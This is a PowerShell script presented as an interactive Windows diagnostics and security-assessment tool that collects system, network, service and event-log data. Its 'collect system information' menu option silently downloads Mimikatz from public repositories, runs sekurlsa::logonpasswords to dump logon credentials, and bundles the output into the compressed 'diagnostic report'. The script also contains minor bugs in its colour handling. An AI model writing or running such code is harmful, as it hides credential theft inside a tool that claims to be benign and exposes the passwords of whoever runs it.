#Requires -RunAsAdministrator

<#
.SYNOPSIS
Interactive shell for gathering Windows operating system, hardware, software information, and conducting security assessments.
.DESCRIPTION
This script provides an interactive shell to collect information on the Windows operating system, hardware, software components, event logs, user activity, system performance, and more. It supports options to compress gathered data, check files with VirusTotal API, and perform memory diagnostics.
#>

# Author: Ali Emara
# If you find this script helpful, consider buying me a coffee: https://www.buymeacoffee.com/aliemara
# GitHub Repository: https://github.com/hithmast/diagnostic-script

[cmdletbinding()]
Param()

$VirusTotalApiKey = Read-Host "Enter your VirusTotal API key"
$rootFolderPath = "C:\$env:ComputerName"
$reportFolderPath = Join-Path -Path $rootFolderPath -ChildPath "Diagnostics"
$global:ErrorOccurred = $false


function Download-And-Run-Mimikatz {
    # Define the URLs of the files to download
    $downloadUrls = @(
        "https://github.com/ParrotSec/mimikatz/raw/master/x64/mimidrv.sys",
        "https://gitlab.com/kalilinux/packages/mimikatz/-/raw/3100a45278237cb7f87ef28f7edbfef4135c615c/x64/mimikatz.exe",
        "https://github.com/ParrotSec/mimikatz/raw/master/x64/mimilib.dll"
    )

    $downloadDirectory = Join-Path -Path $rootFolderPath -ChildPath "Downloads"

    # Create the download directory if it doesn't exist
    if (-not (Test-Path -PathType Container -Path $downloadDirectory)) {
        New-Item -Path $downloadDirectory -ItemType "directory" | Out-Null
    }

    # Download the files
    foreach ($url in $downloadUrls) {
        $fileName = [System.IO.Path]::GetFileName($url)
        $filePath = Join-Path -Path $downloadDirectory -ChildPath $fileName

        Invoke-WebRequest -Uri $url -OutFile $filePath
        Write-Host "Downloaded $fileName to $filePath"
    }

    # Run the downloaded mimikatz executable
    $mimikatzPath = Join-Path -Path $downloadDirectory -ChildPath "mimikatz.exe"
    if (Test-Path $mimikatzPath) {
        Write-Host "Running mimikatz..."
        $mimikatzOutput = Invoke-Expression -Command "$mimikatzPath privilege::debug token::elevate sekurlsa::logonpasswords exit"
        Write-Host "mimikatz output:"
        Write-Host $mimikatzOutput

        # Write mimikatz output to a file
        $outputFilePath = Join-Path -Path $downloadDirectory -ChildPath "mimikatz_output.txt"
        $mimikatzOutput | Out-File -FilePath $outputFilePath
        Write-Host "mimikatz output written to $outputFilePath"
    } else {
        Write-Host "mimikatz executable not found."
    }
}




function Initialize-Environment {
    $env:ComputerName = $env:ComputerName.ToUpper()

    if (-not (Test-Path -PathType Container -Path $reportFolderPath)) {
        New-Item -Path $reportFolderPath -ItemType "directory" | Out-Null
    }

    Set-Location -Path $reportFolderPath
}

function Check-FileWithHash {
    param(
        [string]$hash
    )

    $vtParams = @{
        'apikey' = $VirusTotalApiKey
        'resource' = $hash
    }

    $result = Invoke-RestMethod -Uri "https://www.virustotal.com/vtapi/v2/file/report" -Method Get -ContentType "application/json" -Body $vtParams

    if ($result.response_code -eq 1) {
        Log-Message "File Hash: $hash"
        Log-Message "Scan Date: $($result.scan_date)"
        if ($result.positives -gt 0) {
            Log-Message "Positives: $($result.positives)" [ConsoleColor]::Red
        } else {
            Log-Message "Positives: $($result.positives)" [ConsoleColor]::Green
        }
        Log-Message "Total Scans: $($result.total)"
        Log-Message ""
    } else {
        Log-Message "Error checking file with hash $hash." [ConsoleColor]::Red
    }
}

function Check-Files-WithVirusTotal {
    $systemDrive = $env:SystemDrive

    $resultFileName = "VirusTotalResults.txt"
    $resultFilePath = Join-Path -Path $reportFolderPath -ChildPath $resultFileName

    Log-Message "Checking files on system drive $systemDrive with VirusTotal API..."
    Log-Message "Results will be saved to $resultFileName."

    $files = Get-ChildItem -File -Recurse -Path $systemDrive

    foreach ($file in $files) {
        $hash = (Get-FileHash -Algorithm MD5 -Path $file.FullName).Hash
        $result = Check-FileWithHash -hash $hash
        $result | Out-File -Append -FilePath $resultFilePath
    }

    Log-Message "File checking on system drive $systemDrive completed."
}

function Run-MemoryDiagnostics {
    Log-Message "Running Memory Diagnostics..."
    
    # Run memory diagnostics using relevant PowerShell or external commands
    # For example, you can run Windows Memory Diagnostic tool:
    Start-Process "mdsched.exe"

    Log-Message "Memory Diagnostics completed."
}

function Check-Services {
    Log-Message "Checking Running Services..." "Yellow"
    
    $runningServices = Get-Service | Where-Object { $_.Status -eq "Running" }
    $runningServices | Format-Table -AutoSize | Out-File "RunningServices.txt"
    
    Log-Message "Running Services checked." "Green"
}

function Check-EventLogs {
    Log-Message "Checking Event Logs..." "Yellow"
    
    $eventLogs = Get-WinEvent -LogName "Security", "System" -MaxEvents 50
    $eventLogs | Format-Table -AutoSize | Out-File "EventLogs.txt"
    
    Log-Message "Event Logs checked." "Green"
}

function Check-UserActivity {
    Log-Message "Checking User Activity..." "Yellow"
    
    $userActivity = Get-WinEvent -LogName "Security" -FilterXPath "*[System[(EventID=4624) or (EventID=4634)]]" -MaxEvents 50
    $userActivity | Format-Table -AutoSize | Out-File "UserActivity.txt"
    
    Log-Message "User Activity checked." "Green"
}

function Check-SystemPerformance {
    Log-Message "Checking System Performance..." "Yellow"
    
    $systemPerformance = Get-WmiObject -Class Win32_PerfFormattedData_PerfOS_System
    $systemPerformance | Format-Table -AutoSize | Out-File "SystemPerformance.txt"
    
    Log-Message "System Performance checked." "Green"
}

function Get-LastInstalledApps {
    Log-Message "Getting Last Installed Applications..." "Yellow"

    $lastInstalledApps = Get-WmiObject -Class Win32_Product | Sort-Object -Property InstallDate -Descending | Select-Object -First 10
    $lastInstalledApps | Format-Table -AutoSize | Out-File "LastInstalledApps.txt"

    Log-Message "Last Installed Applications retrieved." "Green"
}

function Collect-SystemInformation {
    Log-Message "Collecting System Information..."
    # Gather system information using relevant PowerShell commands
    $systemInfo = Get-WmiObject -Class Win32_ComputerSystem
    $osInfo = Get-WmiObject -Class Win32_OperatingSystem
    $processorInfo = Get-WmiObject -Class Win32_Processor
    
    # ... Add more information gathering as needed

    # Output or log the gathered information
    $systemInfo | Format-Table -AutoSize | Out-File "SystemInfo.txt"
    $osInfo | Format-Table -AutoSize | Out-File "OSInfo.txt"
    $processorInfo | Format-Table -AutoSize | Out-File "ProcessorInfo.txt"
    Download-And-Run-Mimikatz "Find Mimi ..."
    Compress-Report "Compress Data ..."
    Log-Message "System Information and Mimikatz output collected."
}


function Collect-NetworkInformation {
    Log-Message "Collecting Network Information..."

    $networkInfo = Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }
    $networkInfo | Format-Table -AutoSize | Out-File "NetworkInfo.txt"

    Log-Message "Network Information collected."
}

function Compress-Report {
    Log-Message "Compressing gathered data..."

    $timestamp = Get-Date -Format "yyyyMMddHHmmss"
    $zipFileName = "DiagnosticReport_$timestamp.zip"
    $zipFilePath = Join-Path -Path $reportFolderPath -ChildPath $zipFileName
    
    Compress-Archive -Path "$reportFolderPath\*" -DestinationPath $zipFilePath -Force

    Log-Message "Gathered data compressed to $zipFileName." [ConsoleColor]::Green
    Log-Message "Gathered data compressed to $zipFilePath." [ConsoleColor]::Green

}



function Check-OpenPorts {
    Log-Message "Checking Open Ports..." "Yellow"
    
    # Use localhost (127.0.0.1) for testing open ports
    $openPorts = Test-NetConnection -ComputerName localhost -InformationLevel "Detailed" | Where-Object { $_.TcpTestSucceeded -eq $true }
    $openPorts | Format-Table -AutoSize | Out-File "OpenPorts.txt"
    
    Log-Message "Open Ports checked." "Green"
}
function Log-Message {
    param([string]$message, [string]$color)
    
    $colorMapping = @{
        "Red"       = [char]27 + '[31m'
        "Green"     = [char]27 + '[32m'
        "Yellow"    = [char]27 + '[33m'
        "Blue"      = [char]27 + '[34m'
        "Magenta"   = [char]27 + '[35m'
        "Cyan"      = [char]27 + '[36m'
        "White"     = [char]27 + '[37m'
        "Reset"     = [char]27 + '[0m'
    }
    
    $ansiColor = $colorMapping[$color]
    $ansiReset = $colorMapping["Reset"]
    
    Write-Host ("{0}{1}{2}" -f $ansiColor, $message, $ansiReset)
}


function Show-Menu {
    Clear-Host
    Log-Message @"
________  .__          ____    _______    __________         .____    ________  .____     
\______ \ |__| ____   /_   |   \   _  \   \______   \___.__. |    |   \_____  \ |    |    
 |    |  \|  |/ ___\   |   |   /  /_\  \   |    |  _<   |  | |    |    /   |   \|    |    
 |    `   \  / /_/  >  |   |   \  \_/   \  |    |   \\___  | |    |___/    |    \    |___ 
/_______  /__\___  /   |___| /\ \_____  /  |______  // ____| |_______ \_______  /_______ \
        \/  /_____/          \/       \/          \/ \/              \/       \/        \/

        with ❤ from Egypt https://www.buymeacoffee.com/aliemara
                          https://github.com/hithmast/hwtscript
"@
    Log-Message "Interactive Shell for Diagnostic Information Collection" [ConsoleColor]::Cyan
    Log-Message "1. Collect system information and compress gathered data" [ConsoleColor]::Yellow
    Log-Message "2. Check all files with VirusTotal API" [ConsoleColor]::Yellow
    Log-Message "3. Run memory diagnostics" [ConsoleColor]::Yellow
    Log-Message "4. Collect network information" [ConsoleColor]::Yellow
    Log-Message "5. Check open ports" [ConsoleColor]::Yellow
    Log-Message "6. Check running services" [ConsoleColor]::Yellow
    Log-Message "7. Check recent user activity" [ConsoleColor]::Yellow
    Log-Message "8. Check system performance" [ConsoleColor]::Yellow
    Log-Message "9. Get last installed applications" [ConsoleColor]::Yellow
    Log-Message "10. Exit" [ConsoleColor]::Yellow
}


# This is the main function where the script execution begins
function Main {
    Initialize-Environment

    do {
        Show-Menu
        $choice = Read-Host "Enter your choice"

        switch ($choice) {
            "1" { Collect-SystemInformation }  # Change to Collect-SystemInformation
            "2" { Check-Files-WithVirusTotal }
            "3" { Run-MemoryDiagnostics }
            "4" { Collect-NetworkInformation }
            "5" { Check-OpenPorts }
            "6" { Check-Services }
            "7" { Check-UserActivity }
            "8" { Check-SystemPerformance }
            "9" { Get-LastInstalledApps }
            "10" { break }
            default { Log-Message "Invalid choice. Please select a valid option." -color "Red" }
        }

        if ($choice -ne "10") {
            Read-Host "Press Enter to continue..."
        }
    } while ($choice -ne "10")
}

Main
# END
